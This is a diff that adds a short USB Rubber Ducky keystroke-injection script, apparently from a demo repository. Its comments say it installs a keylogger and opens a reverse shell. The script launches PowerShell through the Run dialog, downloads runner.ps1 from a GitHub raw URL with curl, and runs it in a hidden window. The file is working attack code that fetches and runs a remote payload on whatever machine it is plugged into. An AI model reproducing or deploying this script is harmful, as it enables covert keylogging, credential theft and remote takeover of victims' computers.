@@ -1,0 +1,17 @@
+REM Obtains a keylogger, starts keylogging to a file and creates a reverse shell
+
+REM Allocates time for computer to recognize ducky as a keyboard
+DELAY 1000
+
+GUI r
+DELAY 5000
+STRING powershell -NoP -NonI
+ENTER
+
+DELAY 5000
+
+STRING curl https://raw.githubusercontent.com/lassemand/rubberducky_demo/master/runner.ps1 -O .\runner.ps1
+ENTER
+
+STRING Start-Process -WindowStyle hidden -FilePath powershell.exe -ArgumentList '-NoExit -Command .\runner.ps1'
+ENTER
